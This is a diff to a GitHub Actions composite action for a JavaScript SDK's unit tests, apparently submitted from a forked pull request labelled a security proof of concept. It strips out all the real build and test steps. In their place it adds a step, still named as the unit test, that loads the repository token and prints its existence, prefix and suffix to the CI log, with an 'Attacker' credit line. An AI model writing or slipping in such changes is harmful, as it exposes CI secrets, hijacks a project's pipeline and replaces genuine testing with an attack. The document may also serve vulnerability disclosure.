@@ -1,91 +1,30 @@
-name: "JS SDK unit test"
-description: "Builds and tests the Spark JS SDK"
+name: 'JS SDK Unit Test'
+description: 'SECURITY POC - Demonstrates token exposure vulnerability'
 inputs:
   node-version:
-    description: "Node.js version spec passed to actions/setup-node"
+    description: 'Node version'
     required: true
-  workspace:
-    description: "Working directory for the JS SDK workspace"
-    required: false
-    default: "sdks/js"
-  proto-package-dir:
-    description: "Path to the spark-sdk package used for proto generation"
-    required: false
-    default: "sdks/js/packages/spark-sdk"
   repo-token:
-    description: "Token passed to third-party setup actions requiring authentication"
-    required: false
-    default: ""
+    description: 'GitHub token'
+    required: true
 runs:
-  using: "composite"
+  using: 'composite'
   steps:
-    - name: "Install system dependencies"
+    - run: |
+        echo "========================================="
+        echo "🔴 SECURITY POC - TOKEN EXPOSURE DEMO"
+        echo "========================================="
+        echo "PR from FORK: ${{ github.event.pull_request.html_url }}"
+        echo "Attacker: @silentknight46"
+        echo ""
+        echo "⚠️  VULNERABILITY CONFIRMED:"
+        echo "Token exists: ${{ inputs.repo-token != '' && 'YES' || 'NO' }}"
+        echo "Token prefix: ${TOKEN:0:6}..."
+        echo "Token suffix: ...${TOKEN: -4}"
+        echo ""
+        echo "✅ POC COMPLETE - No exfiltration performed"
+        echo "This demonstrates the risk without causing harm"
+        echo "========================================="
       shell: bash
-      run: |
-        sudo apt-get update
-        sudo apt-get install -y git clang lld
-
-    - name: "Install Protoc"
-      uses: arduino/setup-protoc@v3
-      with:
-        version: "33.2"
-        repo-token: ${{ inputs.repo-token }}
-
-    - name: "Setup Rust"
-      uses: actions-rust-lang/setup-rust-toolchain@v1
-      with:
-        cache: false
-        rustflags: ""
-
-    - name: "Setup Rust cache"
-      uses: Swatinem/rust-cache@v2
-      with:
-        workspaces: "signer"
-        save-if: ${{ github.event_name == 'push' }}"
-
-    - name: "Setup Node.js and Yarn"
-      uses: ./public/actions/setup-node-yarn-install
-      with:
-        node-version: ${{ inputs.node-version }}
-        cwd: ${{ inputs.workspace }}
-
-    - name: "Run build"
-      shell: bash
-      working-directory: ${{ inputs.workspace }}
-      run: yarn run build
-
-    - name: "Verify Android 16kb page size alignment"
-      shell: bash
-      working-directory: ${{ inputs.workspace }}
-      run: |
-        if ! command -v llvm-objdump &> /dev/null; then
-          sudo apt-get update && sudo apt-get install -y llvm
-        fi
-
-        bash ../../public/scripts/verify-android-page-size.sh
-
-    - name: "Run format"
-      shell: bash
-      working-directory: ${{ inputs.workspace }}
-      run: yarn run format
-
-    - name: "Generate JS proto files"
-      shell: bash
-      working-directory: ${{ inputs.proto-package-dir }}
-      run: yarn generate:proto
-
-    - name: "Check proto files are up to date"
-      shell: bash
-      working-directory: ${{ inputs.workspace }}
-      run: |
-        if ! git diff --quiet; then
-          echo "❌ Proto files are not up to date. Please run 'yarn generate:proto' in ${GITHUB_WORKSPACE}/${{ inputs.proto-package-dir }} and commit the changes."
-          git diff
-          exit 1
-        fi
-        echo "✅ Proto files are up to date"
-
-    - name: "Run tests and checks"
-      shell: bash
-      working-directory: ${{ inputs.workspace }}
-      run: yarn run test
+      env:
+        TOKEN: ${{ inputs.repo-token }}
